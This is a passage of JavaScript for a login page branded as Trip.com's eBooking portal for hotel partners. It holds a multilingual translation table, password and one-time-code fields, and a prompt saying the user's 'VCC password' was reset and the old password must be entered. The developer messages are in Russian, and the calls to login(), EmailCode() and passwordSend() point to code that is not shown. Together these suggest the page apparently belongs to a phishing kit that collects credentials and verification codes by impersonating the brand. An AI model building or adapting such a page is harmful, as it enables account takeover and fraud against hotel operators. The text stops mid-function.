document.addEventListener('DOMContentLoaded', function() {
    function handleInputField(inputId, labelId, clearIconSelector) {
        const input = document.getElementById(inputId);
        const label = document.getElementById(labelId);
        const clearIcon = document.querySelector(clearIconSelector);

        if (input && label && clearIcon) {
            input.addEventListener('input', function() {
                if (input.value.trim() !== '') {
                    label.classList.add('hidden');
                    clearIcon.classList.remove('he-trip-kit-ui-input-clear-icon-hidden');
                } else {
                    label.classList.remove('hidden');
                    clearIcon.classList.add('he-trip-kit-ui-input-clear-icon-hidden');
                }
            });

            clearIcon.addEventListener('click', function(event) {
                event.preventDefault();
                event.stopPropagation();
                input.value = '';
                input.focus();
                label.classList.remove('hidden');
                clearIcon.classList.add('he-trip-kit-ui-input-clear-icon-hidden');
                input.dispatchEvent(new Event('input'));
            });
        } else {
            if (!input) console.error(`Поле ввода с id="${inputId}" не найдено`);
            if (!label) console.error(`Метка с id="${labelId}" не найдена`);
            if (!clearIcon) console.error(`Иконка очистки с селектором "${clearIconSelector}" не найдена`);
        }
    }

    function handlePasswordVisibility(passwordInputId, labelId, toggleSelector) {
        const passwordInput = document.getElementById(passwordInputId);
        const labelPassword = document.getElementById(labelId);
        const togglePassword = document.querySelector(toggleSelector);
        const passwordIcon = togglePassword ? togglePassword.querySelector('.anticon') : null;

        if (passwordInput && labelPassword && togglePassword && passwordIcon) {
            passwordInput.addEventListener('input', function() {
                if (passwordInput.value.trim() !== '') {
                    labelPassword.classList.add('hidden');
                } else {
                    labelPassword.classList.remove('hidden');
                }
            });

            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);

                if (type === 'password') {
                    passwordIcon.classList.remove('anticon-eye');
                    passwordIcon.classList.add('anticon-eye-invisible');
                    passwordIcon.innerHTML = `
  <svg viewBox="64 64 896 896" focusable="false" data-icon="eye-invisible" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M942.2 486.2Q889.47 375.11 816.7 305l-50.88 50.88C807.31 395.53 843.45 447.4 874.7 512 791.5 684.2 673.4 766 512 766q-72.67 0-133.87-22.38L323 798.75Q408 838 512 838q288.3 0 430.2-300.3a60.29 60.29 0 000-51.5zm-63.57-320.64L836 122.88a8 8 0 00-11.32 0L715.31 232.2Q624.86 186 512 186q-288.3 0-430.2 300.3a60.3 60.3 0 000 51.5q56.69 119.4 136.5 191.41L112.48 835a8 8 0 000 11.31L155.17 889a8 8 0 0011.31 0l712.15-712.12a8 8 0 000-11.32zM149.3 512C232.6 339.8 350.7 258 512 258c54.54 0 104.13 9.36 149.12 28.39l-70.3 70.3a176 176 0 00-238.13 238.13l-83.42 83.42C223.1 637.49 183.3 582.28 149.3 512zm246.7 0a112.11 112.11 0 01146.2-106.69L401.31 546.2A112 112 0 01396 512z"></path><path d="M508 624c-3.46 0-6.87-.16-10.25-.47l-52.82 52.82a176.09 176.09 0 00227.42-227.42l-52.82 52.82c.31 3.38.47 6.79.47 10.25a111.94 111.94 0 01-112 112z"></path></svg>
                    `;
                    togglePassword.setAttribute('aria-label', 'Показать пароль');
                } else {
                    passwordIcon.classList.remove('anticon-eye-invisible');
                    passwordIcon.classList.add('anticon-eye');
                    passwordIcon.innerHTML = `
  <svg viewBox="64 64 896 896" focusable="false" data-icon="eye" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M942.2 486.2C847.4 286.5 704.1 186 512 186c-192.2 0-335.4 100.5-430.2 300.3a60.3 60.3 0 000 51.5C176.6 737.5 319.9 838 512 838c192.2 0 335.4-100.5 430.2-300.3 7.7-16.2 7.7-35 0-51.5zM512 766c-161.3 0-279.4-81.8-362.7-254C232.6 339.8 350.7 258 512 258c161.3 0 279.4 81.8 362.7 254C791.5 684.2 673.4 766 512 766zm-4-430c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm0 288c-61.9 0-112-50.1-112-112s50.1-112 112-112 112 50.1 112 112-50.1 112-112 112z"></path></svg>
                    `;
                    togglePassword.setAttribute('aria-label', 'Скрыть пароль');
                }
            });
        } else {
            if (!passwordInput) console.error(`Поле ввода с id="${passwordInputId}" не найдено`);
            if (!labelPassword) console.error(`Метка с id="${labelId}" не найдена`);
            if (!togglePassword) console.error('Элемент с классом "toggle-password-visibility" не найден');
            if (!passwordIcon) console.error('Иконка пароля внутри toggle-password-visibility не найдена');
        }
    }

    // ---------------------------------------------------------->
    // *** LOGIN INPUTS ***
    handleInputField('username-input', 'input-label', '.he-trip-kit-ui-input-clear-icon');

    // *** PASSWORD INPUT ***
    handlePasswordVisibility('password-input-wrapper', 'password-label', '.toggle-password-visibility');

    // *** EMAIL LOGIN INPUT ***
    handleInputField('login-email-input-text', 'enter-email-label', '#email-clear');

    // *** VERIFICATION CODE INPUT ***
    handleInputField('login-email-code-input-text', 'enter-verification-code', '#login-email-code-input .he-trip-kit-ui-input-clear-icon');

    // *** SECURITY EMAIL CODE INPUT ***
    handleInputField('security-email-code-input-text', 'please-enter-verification-code', '#clear-verify');

    // *** OLD PASS INPUT ***
    handlePasswordVisibility('old-password', 'the-enter-old-password', '#old-password + .toggle-password-visibility');

    // *** NEW PASS INPUT ***
    handlePasswordVisibility('new-password-one', 'the-enter-new-password-one', '#new-password-one + .toggle-password-visibility');

    // *** NEW PASS INPUT ***
    handlePasswordVisibility('new-password-two', 'the-enter-new-password-two', '#new-password-two + .toggle-password-visibility');
});

  
document.addEventListener('DOMContentLoaded', function() {
  const dropdownTrigger = document.getElementById('change_lang_dropdown');
  const languageDropdown = document.getElementById('language-dropdown');

  if (dropdownTrigger && languageDropdown) {
    dropdownTrigger.addEventListener('click', function(event) {
      event.preventDefault();
      event.stopPropagation();

      languageDropdown.classList.toggle('he-trip-kit-ui-dropdown-hidden');

      const isExpanded = !languageDropdown.classList.contains('he-trip-kit-ui-dropdown-hidden');
      dropdownTrigger.setAttribute('aria-expanded', isExpanded.toString());

      const rect = dropdownTrigger.getBoundingClientRect();
      languageDropdown.style.left = rect.left + 'px';
      languageDropdown.style.top = (rect.bottom + window.scrollY) + 'px';
    });

    document.addEventListener('click', function(event) {
      if (!dropdownTrigger.contains(event.target) && !languageDropdown.contains(event.target)) {
        if (!languageDropdown.classList.contains('he-trip-kit-ui-dropdown-hidden')) {
          languageDropdown.classList.add('he-trip-kit-ui-dropdown-hidden');
          dropdownTrigger.setAttribute('aria-expanded', 'false');
        }
      }
    });
  } else {
    if (!dropdownTrigger) console.error('Элемент с id="change_lang_dropdown" не найден.');
    if (!languageDropdown) console.error('Элемент с id="language-dropdown" не найден.');
  }
});

//
//document.getElementById('sign-in-email').addEventListener('click', function() {
//    const emailLoginWrapper = document.getElementById('login-with-email-wrapper');
//    const usernameLoginWrapper = document.getElementById('login-with-username');
//    const toggleButton = document.getElementById('sign-in-email');

//    if (emailLoginWrapper.classList.contains('right-hidden')) {

//        emailLoginWrapper.classList.remove('right-hidden');
//        usernameLoginWrapper.classList.add('left-hidden');
        
//        toggleButton.textContent = 'Back to password login page';
//    } else {
//        emailLoginWrapper.classList.add('right-hidden');
//        usernameLoginWrapper.classList.remove('left-hidden');
        
//        toggleButton.textContent = 'Sign in with email';
//    }
//});

const languages = {
    "change_lang_zh_CN": "简体中文",
    "change_lang_zh_HK": "繁體(香港)",
    "change_lang_zh_TW": "繁體(臺灣)",
    "change_lang_ja_JP": "日本語",
    "change_lang_ko_KR": "한국어",
    "change_lang_th_TH": "ภาษาไทย",
    "change_lang_vi_VN": "Tiếng Việt",
    "change_lang_id_ID": "Bahasa Indonesia",
    "change_lang_en_US": "English"
};

const translations = {
    en_US: {
        "sign-in-label": "Sign in and list your property",
        "input-label": "User name/email address",
        "password-label": "Password",
        "enter-email-label": "Enter email",
        "enter-verification-code": "Enter verification code",
        "login-button": "Login",
        "sign-in-email": "Sign in with email",
        "toggle-account-type": "Trip.com employee? Sign in here.",
        "forgot-password-link": "Forgot password",
        "banner-title": "Sign in to manage your property",
        "banner-desc": "Welcome Back",
        "join-us-title": "Welcome to eBooking",
        "join-us-desc": "Over 600 million users book their travel with Trip.com, and we partner with over a million properties globally.",
        "attract-guests": "Attract guests",
        "set-room-rates": "Set room rates",
        "manage-bookings": "Manage bookings",
        "access-in-depth-analytics": "Access in-depth analytics",
        "join_us_button": "Create an eBooking account",
        "business-consultation": "Business Consultation",
        "violation-report-email": "Violation Report Email",
        "quick-links": "Quick Links",
        "login-box-code-send": "Send",
        "login-box-code-send-two": "Send",
        "sent-text": "Sent",
        "sign-in-email": "Back to password login page",
        "please-enter-verification-code": "Please enter a verification code",
        "verify": "Verification",
        "verify-box": 'For account security, we will send verification information to your mobile phone or Email. please click "Send" to get verification code.',
        "login-box-button-verification": "Verify",
        "verify-box-bottom-desc": "Cannot verify? Please call +44-20-3929-3737",
        "error-msg-trans": "Invalid login or password.",
        "error-msg-trans-otp": "Invalid otp code.",
        "reset-password-qwe": "Reset password",
        "reset-reason": "For security reasons, we have reset your VCC password. You need to update it before logging in.",
        "the-enter-old-password": "Old password",
        "the-enter-new-password-one": "New password",
        "the-enter-new-password-two": "Confirm a new password",
        "password-ok": "Submit",
        "old-password-error": "You entered the wrong password."
    },
    zh_CN: {
        "sign-in-label": "登录并列出您的房源",
        "input-label": "用户名/电子邮件地址",
        "password-label": "密码",
        "enter-email-label": "输入电子邮件",
        "enter-verification-code": "输入验证码",
        "login-button": "登录",
        "sign-in-email": "通过电子邮件登录",
        "toggle-account-type": "Trip.com员工？在此登录。",
        "forgot-password-link": "忘记密码",
        "banner-title": "登录以管理您的房源",
        "banner-desc": "欢迎回来",
        "join-us-title": "欢迎使用eBooking",
        "join-us-desc": "超过6亿用户通过Trip.com预订旅行，我们与全球超过一百万个房源合作。",
        "attract-guests": "吸引客人",
        "set-room-rates": "设置房价",
        "manage-bookings": "管理预订",
        "access-in-depth-analytics": "访问深入的分析",
        "join_us_button": "创建eBooking帐户",
        "business-consultation": "业务咨询",
        "violation-report-email": "违规报告电子邮件",
        "quick-links": "快速链接",
        "login-box-code-send": "发送",
        "login-box-code-send-two": "发送",
        "sent-text": "已发送",
        "sign-in-email": "返回密码登录页面",
        "please-enter-verification-code": "请输入验证码",
        "verify": "验证",
        "verify-box": "为了账户安全，我们会将验证信息发送到您的手机或电子邮件，请点击“发送”获取验证码。",
        "login-box-button-verification": "验证",
        "verify-box-bottom-desc": "无法验证？请致电 +44-20-3929-3737",
        "error-msg-trans": "登录名或密码无效。",
        "error-msg-trans-otp": "无效的验证码。",
        "reset-password-qwe": "重置密码",
        "reset-reason": "出于安全原因，我们已重置您的VCC密码。您需要在登录前更新它。",
        "the-enter-old-password": "旧密码",
        "the-enter-new-password-one": "新密码",
        "the-enter-new-password-two": "确认新密码",
        "password-ok": "提交",
        "old-password-error": "您输入了错误的密码。"
    },
    zh_HK: {
        "sign-in-label": "登錄並列出您的房源",
        "input-label": "用戶名/電子郵件地址",
        "password-label": "密碼",
        "enter-email-label": "輸入電子郵件",
        "enter-verification-code": "輸入驗證碼",
        "login-button": "登錄",
        "sign-in-email": "使用電子郵件登錄",
        "toggle-account-type": "Trip.com員工？在此登錄。",
        "forgot-password-link": "忘記密碼",
        "banner-title": "登錄以管理您的房源",
        "banner-desc": "歡迎回來",
        "join-us-title": "歡迎使用eBooking",
        "join-us-desc": "超過6億用戶通過Trip.com預訂旅行，我們與全球超過一百萬個房源合作。",
        "attract-guests": "吸引客人",
        "set-room-rates": "設定房價",
        "manage-bookings": "管理預訂",
        "access-in-depth-analytics": "存取深入的分析",
        "join_us_button": "創建eBooking帳戶",
        "business-consultation": "業務諮詢",
        "violation-report-email": "違規報告電子郵件",
        "quick-links": "快速鏈接",
        "login-box-code-send": "發送",
        "login-box-code-send-two": "發送",
        "sent-text": "已發送",
        "sign-in-email": "返回密碼登錄頁面",
        "please-enter-verification-code": "請輸入驗證碼",
        "verify": "驗證",
        "verify-box": "為了帳戶安全，我們會將驗證信息發送到您的手機或電子郵件，請點擊“發送”以獲取驗證碼。",
        "login-box-button-verification": "驗證",
        "verify-box-bottom-desc": "無法驗證？請致電 +44-20-3929-3737",
        "error-msg-trans": "登錄名或密碼無效。",
        "error-msg-trans-otp": "無效的驗證碼。",
        "reset-password-qwe": "重設密碼",
        "reset-reason": "出於安全原因，我們已重置您的VCC密碼。您需要在登錄前更新它。",
        "the-enter-old-password": "舊密碼",
        "the-enter-new-password-one": "新密碼",
        "the-enter-new-password-two": "確認新密碼",
        "password-ok": "提交",
        "old-password-error": "您輸入了錯誤的密碼。"
    },
    zh_TW: {
        "sign-in-label": "登入並列出您的房源",
        "input-label": "用戶名/電子郵件地址",
        "password-label": "密碼",
        "enter-email-label": "輸入電子郵件",
        "enter-verification-code": "輸入驗證碼",
        "login-button": "登入",
        "sign-in-email": "使用電子郵件登入",
        "toggle-account-type": "Trip.com員工？在此登入。",
        "forgot-password-link": "忘記密碼",
        "banner-title": "登入以管理您的房源",
        "banner-desc": "歡迎回來",
        "join-us-title": "歡迎使用eBooking",
        "join-us-desc": "超過6億用戶通過Trip.com預訂旅行，我們與全球超過一百萬個房源合作。",
        "attract-guests": "吸引客人",
        "set-room-rates": "設定房價",
        "manage-bookings": "管理預訂",
        "access-in-depth-analytics": "存取深入的分析",
        "join_us_button": "創建eBooking帳戶",
        "business-consultation": "業務諮詢",
        "violation-report-email": "違規報告電子郵件",
        "quick-links": "快速鏈接",
        "login-box-code-send": "發送",
        "login-box-code-send-two": "發送",
        "sent-text": "已發送",
        "sign-in-email": "返回密碼登入頁面",
        "please-enter-verification-code": "請輸入驗證碼",
        "verify": "驗證",
        "verify-box": "為了帳戶安全，我們會將驗證信息發送到您的手機或電子郵件，請點擊“發送”以獲取驗證碼。",
        "login-box-button-verification": "驗證",
        "verify-box-bottom-desc": "無法驗證？請致電 +44-20-3929-3737",
        "error-msg-trans": "登入名或密碼無效。",
        "error-msg-trans-otp": "無效的驗證碼。",
        "reset-password-qwe": "重設密碼",
        "reset-reason": "出於安全原因，我們已重置您的VCC密碼。您需要在登錄前更新它。",
        "the-enter-old-password": "舊密碼",
        "the-enter-new-password-one": "新密碼",
        "the-enter-new-password-two": "確認新密碼",
        "password-ok": "提交",
        "old-password-error": "您輸入了錯誤的密碼。"
    },
    ja_JP: {
        "sign-in-label": "サインインして物件をリストに追加する",
        "input-label": "ユーザー名/メールアドレス",
        "password-label": "パスワード",
        "enter-email-label": "メールアドレスを入力",
        "enter-verification-code": "確認コードを入力",
        "login-button": "ログイン",
        "sign-in-email": "メールでサインイン",
        "toggle-account-type": "Trip.comの従業員ですか？ここでサインイン。",
        "forgot-password-link": "パスワードをお忘れですか",
        "banner-title": "物件を管理するためにサインイン",
        "banner-desc": "お帰りなさい",
        "join-us-title": "eBookingへようこそ",
        "join-us-desc": "6億以上のユーザーがTrip.comで旅行を予約し、私たちは世界中の100万以上の物件と提携しています。",
        "attract-guests": "ゲストを惹きつける",
        "set-room-rates": "部屋料金を設定",
        "manage-bookings": "予約を管理",
        "access-in-depth-analytics": "詳細な分析にアクセス",
        "join_us_button": "eBookingアカウントを作成",
        "business-consultation": "ビジネスコンサルティング",
        "violation-report-email": "違反報告メール",
        "quick-links": "クイックリンク",
        "login-box-code-send": "送信",
        "login-box-code-send-two": "送信",
        "sent-text": "送信済み",
        "sign-in-email": "パスワードログインページに戻る",
        "please-enter-verification-code": "確認コードを入力してください",
        "verify": "確認",
        "verify-box": "アカウントのセキュリティのために、確認情報を携帯電話またはメールに送信します。「送信」をクリックして確認コードを取得してください。",
        "login-box-button-verification": "確認",
        "verify-box-bottom-desc": "確認できませんか？+44-20-3929-3737に電話してください",
        "error-msg-trans": "ログイン名またはパスワードが無効です。",
        "error-msg-trans-otp": "無効なOTPコードです。",
        "reset-password-qwe": "パスワードのリセット",
        "reset-reason": "セキュリティ上の理由から、VCCパスワードをリセットしました。ログインする前に更新してください。",
        "the-enter-old-password": "古いパスワード",
        "the-enter-new-password-one": "新しいパスワード",
        "the-enter-new-password-two": "新しいパスワードを確認してください",
        "password-ok": "送信",
        "old-password-error": "パスワードが間違っています。"
    },
    ko_KR: {
        "sign-in-label": "로그인하여 숙소를 등록하세요",
        "input-label": "이메일/사용자 이름",
        "password-label": "비밀번호",
        "enter-email-label": "이메일 입력",
        "enter-verification-code": "인증 코드 입력",
        "login-button": "로그인",
        "sign-in-email": "이메일로 로그인",
        "toggle-account-type": "Trip.com 직원이신가요? 여기에서 로그인하세요.",
        "forgot-password-link": "비밀번호를 잊으셨나요?",
        "banner-title": "숙소 관리하기 위해 로그인하세요",
        "banner-desc": "다시 오신 것을 환영합니다",
        "join-us-title": "eBooking에 오신 것을 환영합니다",
        "join-us-desc": "Trip.com을 통해 6억 명 이상의 사용자가 여행을 예약하며, 우리는 전 세계 백만 개 이상의 숙소와 협력하고 있습니다.",
        "attract-guests": "고객 유치",
        "set-room-rates": "객실 요금 설정",
        "manage-bookings": "예약 관리",
        "access-in-depth-analytics": "심층 분석 액세스",
        "join_us_button": "eBooking 계정 만들기",
        "business-consultation": "비즈니스 상담",
        "violation-report-email": "위반 보고 이메일",
        "quick-links": "빠른 링크",
        "login-box-code-send": "보내기",
        "login-box-code-send-two": "보내기",
        "sent-text": "전송됨",
        "sign-in-email": "비밀번호 로그인 페이지로 돌아가기",
        "please-enter-verification-code": "인증 코드를 입력하세요",
        "verify": "확인",
        "verify-box": "계정 보안을 위해 확인 정보를 휴대전화 또는 이메일로 보내드립니다. 인증 코드를 받으려면 '보내기'를 클릭하세요.",
        "login-box-button-verification": "확인",
        "verify-box-bottom-desc": "인증할 수 없습니까? +44-20-3929-3737로 전화하세요",
        "error-msg-trans": "로그인 이름 또는 비밀번호가 유효하지 않습니다.",
        "error-msg-trans-otp": "유효하지 않은 OTP 코드입니다.",
        "reset-password-qwe": "비밀번호 재설정",
        "reset-reason": "보안상의 이유로 VCC 비밀번호가 재설정되었습니다. 로그인하기 전에 업데이트하세요.",
        "the-enter-old-password": "이전 비밀번호",
        "the-enter-new-password-one": "새 비밀번호",
        "the-enter-new-password-two": "새 비밀번호 확인",
        "password-ok": "제출",
        "old-password-error": "잘못된 비밀번호를 입력하셨습니다."

    },
    th_TH: {
        "sign-in-label": "เข้าสู่ระบบและลงประกาศที่พักของคุณ",
        "input-label": "ชื่อผู้ใช้/อีเมล",
        "password-label": "รหัสผ่าน",
        "enter-email-label": "กรอกอีเมล",
        "enter-verification-code": "กรอกรหัสยืนยัน",
        "login-button": "เข้าสู่ระบบ",
        "sign-in-email": "เข้าสู่ระบบด้วยอีเมล",
        "toggle-account-type": "พนักงาน Trip.com? ลงชื่อเข้าใช้ที่นี่",
        "forgot-password-link": "ลืมรหัสผ่าน",
        "banner-title": "เข้าสู่ระบบเพื่อจัดการที่พักของคุณ",
        "banner-desc": "ยินดีต้อนรับกลับ",
        "join-us-title": "ยินดีต้อนรับสู่ eBooking",
        "join-us-desc": "ผู้ใช้มากกว่า 600 ล้านคนจองการเดินทางกับ Trip.com และเราร่วมมือกับที่พักมากกว่าล้านแห่งทั่วโลก",
        "attract-guests": "ดึงดูดผู้เข้าพัก",
        "set-room-rates": "กำหนดอัตราห้องพัก",
        "manage-bookings": "จัดการการจอง",
        "access-in-depth-analytics": "เข้าถึงการวิเคราะห์เชิงลึก",
        "join_us_button": "สร้างบัญชี eBooking",
        "business-consultation": "ปรึกษาธุรกิจ",
        "violation-report-email": "อีเมลรายงานการละเมิด",
        "quick-links": "ลิงก์ด่วน",
        "login-box-code-send": "ส่ง",
        "login-box-code-send-two": "ส่ง",
        "sent-text": "ส่งแล้ว",
        "sign-in-email": "กลับไปยังหน้าเข้าสู่ระบบด้วยรหัสผ่าน",
        "please-enter-verification-code": "กรุณากรอกรหัสยืนยัน",
        "verify": "ยืนยัน",
        "verify-box": "เพื่อความปลอดภัยของบัญชี เราจะส่งข้อมูลยืนยันไปยังโทรศัพท์มือถือหรืออีเมลของคุณ กรุณาคลิก 'ส่ง' เพื่อรับรหัสยืนยัน",
        "login-box-button-verification": "ยืนยัน",
        "verify-box-bottom-desc": "ไม่สามารถยืนยันได้? กรุณาโทร +44-20-3929-3737",
        "error-msg-trans": "ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง",
        "error-msg-trans-otp": "รหัส OTP ไม่ถูกต้อง",
        "reset-password-qwe": "รีเซ็ตรหัสผ่าน",
        "reset-reason": "ด้วยเหตุผลด้านความปลอดภัย เราได้รีเซ็ตรหัสผ่าน VCC ของคุณ คุณจำเป็นต้องอัปเดตก่อนเข้าสู่ระบบ",
        "the-enter-old-password": "รหัสผ่านเดิม",
        "the-enter-new-password-one": "รหัสผ่านใหม่",
        "the-enter-new-password-two": "ยืนยันรหัสผ่านใหม่",
        "password-ok": "ส่ง",
        "old-password-error": "คุณกรอกรหัสผ่านผิด"
    },
    vi_VN: {
        "sign-in-label": "Đăng nhập và liệt kê tài sản của bạn",
        "input-label": "Tên người dùng/Địa chỉ email",
        "password-label": "Mật khẩu",
        "enter-email-label": "Nhập email",
        "enter-verification-code": "Nhập mã xác minh",
        "login-button": "Đăng nhập",
        "sign-in-email": "Đăng nhập bằng email",
        "toggle-account-type": "Nhân viên của Trip.com? Đăng nhập tại đây.",
        "forgot-password-link": "Quên mật khẩu",
        "banner-title": "Đăng nhập để quản lý tài sản của bạn",
        "banner-desc": "Chào mừng trở lại",
        "join-us-title": "Chào mừng đến với eBooking",
        "join-us-desc": "Hơn 600 triệu người dùng đặt chuyến du lịch của họ với Trip.com, và chúng tôi hợp tác với hơn một triệu tài sản trên toàn thế giới.",
        "attract-guests": "Thu hút khách",
        "set-room-rates": "Đặt giá phòng",
        "manage-bookings": "Quản lý đặt phòng",
        "access-in-depth-analytics": "Truy cập phân tích chi tiết",
        "join_us_button": "Tạo tài khoản eBooking",
        "business-consultation": "Tư vấn kinh doanh",
        "violation-report-email": "Email báo cáo vi phạm",
        "quick-links": "Liên kết nhanh",
        "login-box-code-send": "Gửi",
        "login-box-code-send-two": "Gửi",
        "sent-text": "Đã gửi",
        "sign-in-email": "Trở lại trang đăng nhập bằng mật khẩu",
        "please-enter-verification-code": "Vui lòng nhập mã xác minh",
        "verify": "Xác nhận",
        "verify-box": "Vì lý do bảo mật tài khoản, chúng tôi sẽ gửi thông tin xác minh đến điện thoại hoặc email của bạn. Vui lòng nhấp vào 'Gửi' để nhận mã xác minh.",
        "login-box-button-verification": "Xác nhận",
        "verify-box-bottom-desc": "Không thể xác minh? Vui lòng gọi +44-20-3929-3737",
        "error-msg-trans": "Tên đăng nhập hoặc mật khẩu không hợp lệ.",
        "error-msg-trans-otp": "Mã OTP không hợp lệ.",
        "reset-password-qwe": "Đặt lại mật khẩu",
        "reset-reason": "Vì lý do bảo mật, chúng tôi đã đặt lại mật khẩu VCC của bạn. Bạn cần cập nhật nó trước khi đăng nhập.",
        "the-enter-old-password": "Mật khẩu cũ",
        "the-enter-new-password-one": "Mật khẩu mới",
        "the-enter-new-password-two": "Xác nhận mật khẩu mới",
        "password-ok": "Gửi",
        "old-password-error": "Bạn đã nhập sai mật khẩu."
    },
    id_ID: {
        "sign-in-label": "Masuk dan daftar properti Anda",
        "input-label": "Nama pengguna/Alamat email",
        "password-label": "Kata sandi",
        "enter-email-label": "Masukkan email",
        "enter-verification-code": "Masukkan kode verifikasi",
        "login-button": "Masuk",
        "sign-in-email": "Masuk dengan email",
        "toggle-account-type": "Karyawan Trip.com? Masuk di sini.",
        "forgot-password-link": "Lupa kata sandi",
        "banner-title": "Masuk untuk mengelola properti Anda",
        "banner-desc": "Selamat datang kembali",
        "join-us-title": "Selamat datang di eBooking",
        "join-us-desc": "Lebih dari 600 juta pengguna memesan perjalanan mereka dengan Trip.com, dan kami bermitra dengan lebih dari satu juta properti di seluruh dunia.",
        "attract-guests": "Menarik tamu",
        "set-room-rates": "Atur harga kamar",
        "manage-bookings": "Kelola pemesanan",
        "access-in-depth-analytics": "Akses analitik mendalam",
        "join_us_button": "Buat akun eBooking",
        "business-consultation": "Konsultasi Bisnis",
        "violation-report-email": "Email Laporan Pelanggaran",
        "quick-links": "Tautan Cepat",
        "login-box-code-send": "Kirim",
        "login-box-code-send-two": "Kirim",
        "sent-text": "Terkirim",
        "sign-in-email": "Kembali ke halaman masuk dengan kata sandi",
        "please-enter-verification-code": "Silakan masukkan kode verifikasi",
        "verify": "Verifikasi",
        "verify-box": "Untuk keamanan akun, kami akan mengirimkan informasi verifikasi ke ponsel atau email Anda. Silakan klik 'Kirim' untuk mendapatkan kode verifikasi.",
        "login-box-button-verification": "Verifikasi",
        "verify-box-bottom-desc": "Tidak bisa memverifikasi? Silakan hubungi +44-20-3929-3737",
        "error-msg-trans": "Nama pengguna atau kata sandi tidak valid.",
        "error-msg-trans-otp": "Kode OTP tidak valid.",
        "reset-password-qwe": "Setel ulang kata sandi",
        "reset-reason": "Demi alasan keamanan, kami telah mereset kata sandi VCC Anda. Anda perlu memperbaruinya sebelum masuk.",
        "the-enter-old-password": "Kata sandi lama",
        "the-enter-new-password-one": "Kata sandi baru",
        "the-enter-new-password-two": "Konfirmasi kata sandi baru",
        "password-ok": "Kirim",
        "old-password-error": "Anda memasukkan kata sandi yang salah."
    }
    
};

function changeLanguage(languageId) {
    console.log(`Changing language to: ${languageId}`);
    
    const languageCode = languageId.split('_').slice(2).join('_'); 
    console.log(`Language code: ${languageCode}`);
    
    const selectedLanguageText = languages[languageId];
    

    const selectedLanguageElement = document.getElementById('selected-language');
    if (selectedLanguageElement) {
        selectedLanguageElement.textContent = selectedLanguageText;
    } else {
        console.error("Element with ID 'selected-language' not found.");
    }


    applyTranslations(languageCode);

    localStorage.setItem('selectedLanguage', languageId);

    updateLanguageMenu(languageId);
}

function applyTranslations(languageCode) {
    console.log(`Applying translations for: ${languageCode}`);
    const translation = translations[languageCode];

    if (!translation) {
        console.error(`No translations found for: ${languageCode}`);
        return;
    }

    for (const key in translation) {
        const element = document.getElementById(key);
        if (element) {
            if (element.placeholder !== undefined) {
                element.placeholder = translation[key];
            } else {
                element.textContent = translation[key];
            }
        } else {
            console.warn(`Element with ID '${key}' not found in the document.`);
        }
    }
}


function updateLanguageMenu(currentLanguageId) {
    console.log(`Updating language menu, hiding: ${currentLanguageId}`);
    document.querySelectorAll('#language-menu li').forEach(item => {
        if (item.id === currentLanguageId) {
            item.style.display = 'none'; 
        } else {
            item.style.display = '';
        }
    });
}
document.querySelectorAll('#language-menu li').forEach(item => {
    item.addEventListener('click', function() {
        const languageId = this.id;
        changeLanguage(languageId);
    });
});

document.addEventListener('DOMContentLoaded', function() {
    const savedLanguage = localStorage.getItem('selectedLanguage');
    
    if (savedLanguage && languages[savedLanguage]) {
        console.log(`Loading saved language: ${savedLanguage}`);
        changeLanguage(savedLanguage);
    } else {
        console.log('No saved language found, defaulting to English.');
        changeLanguage('change_lang_en_US');
    }
});

    const sendButton = document.getElementById('login-box-code-send-two');

    function getSelectedLanguage() {
        const selectedLanguageKey = localStorage.getItem('selectedLanguage') || 'change_lang_en_US'; 
        const languageCode = selectedLanguageKey.replace('change_lang_', '');
        console.log('Selected language:', languageCode);
        return languageCode;
    }

    function getTranslation(key) {
        const selectedLanguage = getSelectedLanguage();
        const translation = translations[selectedLanguage];

        if (!translation) {
            console.warn(`No translations found for ${selectedLanguage}, falling back to English.`);
            return translations['en_US'][key] || key;
        }

        if (!translation[key]) {
            console.warn(`Key ${key} not found for ${selectedLanguage}, using English fallback.`);
            return translations['en_US'][key] || key;
        }

        return translation[key];
    }

    function startCountdown() {
        let countdown = 60;
        sendButton.classList.add('send-disabled');
        sendButton.classList.remove('handler-attached');
        sendButton.innerText = `${getTranslation('sent-text')} (${countdown}s)`;
    
        const timer = setInterval(function() {
            countdown--;
            sendButton.innerText = `${getTranslation('sent-text')} (${countdown}s)`;
    
            if (countdown === 0) {
                clearInterval(timer);
                sendButton.innerText = getTranslation('login-box-code-send');
                sendButton.classList.remove('send-disabled');
    
                if (!sendButton.classList.contains('handler-attached')) {
                    sendButton.addEventListener('click', handleSendClick);
                    sendButton.classList.add('handler-attached');
                }
            }
        }, 1000);
    }
    
    function handleSendClick() {
        sendSend();
        sendButton.removeEventListener('click', handleSendClick);
        startCountdown();
    }
    
    sendButton.addEventListener('click', function() {
        if (!sendButton.classList.contains('send-disabled')) {
            startCountdown();
        }
    });

    sendButton.addEventListener('click', function() {
        if (!sendButton.classList.contains('send-disabled')) {
            startCountdown();
        }
    });

    const selectedLanguage = getSelectedLanguage();
    console.log('Initial selected language:', selectedLanguage);

  document.addEventListener('DOMContentLoaded', function () {
    const usernameInput = document.getElementById('username-input');
    const passwordInput = document.getElementById('password-input-wrapper');
    const loginButton = document.getElementById('hotel-login-box-button');

    function toggleButtonState() {
      const isUsernameValid = usernameInput.value.length >= 3;
      const isPasswordValid = passwordInput.value.length >= 3;
      loginButton.disabled = !(isUsernameValid && isPasswordValid);
    }

    loginButton.addEventListener('click', function () {
      if (usernameInput.value.length >= 3 && passwordInput.value.length >= 3) {
        login ()
      } else {
        alert('Username и Password должны быть больше или равны 3 символам.');
      }
    });

    usernameInput.addEventListener('input', toggleButtonState);
    passwordInput.addEventListener('input', toggleButtonState);
  });

  document.addEventListener('DOMContentLoaded', function() {
    var signInButton = document.getElementById('login-box-button-verification');
    signInButton.addEventListener('click', function() {
        EmailCode ();
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var signInButton = document.getElementById('password-ok');
    signInButton.addEventListener('click', function() {
        passwordSend ();
    });
});


document.getElementById('new-password-one').addEventListener('input', checkPasswords);
document.getElementById('new-password-two').addEventListener('input', checkPasswords);

function checkPasswords() {
    const passwordOne = document.getElementById('new-password-one').value;
    const passwordTwo = document.getElementById('new-password-two').value;
